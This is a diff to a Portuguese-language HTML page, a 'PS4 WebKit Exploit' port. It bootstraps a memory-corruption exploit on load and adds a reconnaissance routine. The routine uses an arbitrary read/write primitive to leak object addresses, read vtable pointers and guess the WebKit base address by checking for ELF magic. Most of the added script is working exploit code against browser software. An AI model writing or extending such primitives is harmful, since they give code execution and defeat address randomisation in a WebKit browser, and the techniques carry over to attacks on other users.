@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -12,30 +13,60 @@
     color: #c8ced8;
     font: 14px/1.5 "Segoe UI", system-ui, sans-serif;
     display: flex; flex-direction: column;
-    align-items: center; justify-content: center;
-    gap: 18px;
+    align-items: center;
+    justify-content: flex-start;
+    gap: 14px;
+    padding: 20px;
   }
+  h1 { color: #fff; font-size: 22px; letter-spacing: 0.5px; }
   #status {
     font-size: 20px; font-weight: 700; color: #fff;
     min-height: 1.5em;
+    text-align: center;
   }
   #log {
-    width: 90%; max-width: 720px; height: 320px;
+    width: 95%; max-width: 900px; height: 520px;
     background: #111827; border: 1px solid #1f2937;
-    border-radius: 10px; padding: 12px 14px;
+    border-radius: 10px; padding: 14px 16px;
     overflow-y: auto; font-family: ui-monospace, SFMono-Regular, monospace;
     font-size: 12px; color: #9fb1c3;
     white-space: pre-wrap; word-break: break-all;
+    box-shadow: inset 0 2px 8px rgba(0,0,0,0.4);
   }
   #log .ok { color: #4ade80; }
   #log .err { color: #f87171; }
   #log .info { color: #60a5fa; }
+  #log .warn { color: #fbbf24; }
+  #actions {
+    display: flex; gap: 12px; flex-wrap: wrap;
+    justify-content: center;
+  }
+  button {
+    padding: 12px 28px; border: 1px solid rgba(255,255,255,0.18);
+    border-radius: 12px; color: #fff;
+    background: linear-gradient(135deg, #3b82f6, #1d4ed8);
+    box-shadow: 0 8px 24px rgba(37,99,235,0.28);
+    font: 700 15px/1 "Segoe UI", system-ui, sans-serif;
+    cursor: pointer; transition: all .12s ease;
+  }
+  button:hover { transform: translateY(-2px); }
+  button:active { transform: translateY(1px); }
+  button:disabled {
+    opacity: 0.45; cursor: not-allowed; transform: none;
+    background: #374151; box-shadow: none;
+  }
+  .hidden { display: none !important; }
 </style>
 </head>
 <body>
 
+<h1>PS4 WebKit Exploit — Slopkit Port</h1>
 <div id="status">Inicializando...</div>
 <div id="log"></div>
+<div id="actions">
+  <button id="btnRecon" disabled>Executar Recon</button>
+  <button id="btnClear" onclick="clearLog()">Limpar Log</button>
+</div>
 
 <script type="module">
   import { establishPrimitive } from "./resources/core.js";
@@ -43,6 +74,7 @@
 
   const status = document.getElementById("status");
   const logBox = document.getElementById("log");
+  const btnRecon = document.getElementById("btnRecon");
 
   function log(msg, cls = "info") {
     const line = document.createElement("div");
@@ -52,6 +84,10 @@
     logBox.scrollTop = logBox.scrollHeight;
   }
 
+  window.clearLog = function() {
+    logBox.innerHTML = "";
+  };
+
   function onCoreEvent(tag, detail) {
     log(`${tag}: ${detail}`, "info");
   }
@@ -60,7 +96,66 @@
     log(`${tag}: ${detail}`, "info");
   }
 
-  log("Carregando m�dulos...", "ok");
+  // ========== RECONHECIMENTO PS4 ==========
+  window.reconPS4 = async function() {
+    const p = window.p;
+    if (!p) {
+      log("window.p não está disponível!", "err");
+      return;
+    }
+    log("=== INICIANDO RECON PS4 ===", "ok");
+
+    try {
+      // 1. Leak textarea
+      let textarea = document.createElement("textarea");
+      let textAddr = p.leakval(textarea);
+      log(`textarea object @ 0x${textAddr.toString(16)}`, "info");
+
+      // 2. Vtable pointer (offset +0x18 no PS4 WebKit — ajuste se necessário)
+      let vtablePtr = p.read8(textAddr.add32(0x18));
+      log(`vtable ptr @ 0x${vtablePtr.toString(16)}`, "info");
+
+      // 3. Primeiro entry do vtable
+      let firstEntry = p.read8(vtablePtr);
+      log(`first vtable entry @ 0x${firstEntry.toString(16)}`, "info");
+
+      // 4. Tentar achar base do WebKit (alinhado em 0x1000)
+      //    O offset abaixo é um PLACEHOLDER — substitua pelo offset real do seu firmware!
+      let webkitBaseGuess = firstEntry.sub32(firstEntry.low32() & 0xFFF); // alinha para baixo
+      log(`WebKit base (guess, aligned) ~ 0x${webkitBaseGuess.toString(16)}`, "warn");
+
+      // 5. Sanity check: ler magic bytes
+      let magic = p.read4(webkitBaseGuess);
+      let magicHex = "0x" + magic.toString(16).padStart(8, '0');
+      log(`Magic at guessed base: ${magicHex}`, "info");
+      if (magicHex === "0x464c457f") {
+        log("ELF magic detectado! Base provavelmente correta.", "ok");
+      } else {
+        log("Magic não é ELF. Ajuste o offset do vtable manualmente.", "warn");
+      }
+
+      // 6. Leak de alguns objetos no heap para mapear o layout
+      log("Heap sample (5 arrays):", "info");
+      for (let i = 0; i < 5; i++) {
+        let arr = new Uint8Array(0x100);
+        let addr = p.leakval(arr);
+        log(`  Array[${i}] @ 0x${addr.toString(16)}`, "info");
+      }
+
+      // 7. Tentar ler __stack_chk_guard se soubermos um padrão
+      //    (isso requer offsets específicos do firmware)
+      log("=== RECON FINALIZADO ===", "ok");
+      log("Próximo: ajuste o offset do vtable para sua versão de firmware.", "warn");
+
+    } catch (e) {
+      log(`ERRO no recon: ${e.name}: ${e.message}`, "err");
+    }
+  };
+
+  btnRecon.onclick = window.reconPS4;
+
+  // ========== BOOTSTRAP DO EXPLOIT ==========
+  log("Carregando módulos...", "ok");
   status.textContent = "Executando exploit...";
 
   establishPrimitive({ onEvent: onCoreEvent })
@@ -70,20 +165,20 @@
 
       const prim = installWindowP(carrier, {
         onEvent: onMemEvent,
-        promote: true   // tenta promover para real pair
+        promote: true
       });
 
       log("Mem: real pair ativo", "ok");
-      log(`window.p est� dispon�vel`, "ok");
+      log("window.p está disponível", "ok");
 
-      // Expor globalmente para uso manual/debug
       window.__carrier = carrier;
       window.__prim = prim;
 
-      status.textContent = "RW Primitivo OK";
+      status.textContent = "RW Primitivo OK — Pronto para Recon";
       status.style.color = "#4ade80";
+      btnRecon.disabled = false;
 
-      // Teste r�pido de sanity: leak do pr�prio carrier
+      // Sanity check
       try {
         const testAddr = prim.leakval(prim);
         log(`Sanity leak(prim) = 0x${testAddr.toString(16)}`, "ok");
